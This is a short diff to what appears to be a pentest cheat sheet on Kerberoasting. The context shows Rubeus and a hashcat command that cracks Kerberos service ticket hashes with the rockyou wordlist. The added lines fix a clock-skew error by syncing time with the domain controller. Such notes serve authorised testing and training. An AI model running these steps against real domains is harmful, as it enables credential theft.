@@ -25,3 +25,9 @@ Rubeus.exe kerberoast
 ```bash
 hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
+
+## Error handling
+The error **Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)** means that the DC time is not synchronized with your local time
+
+Mitigation : `rdate -n <IP of DC>`
+/!\\ be sure to unset automatic time from your settings
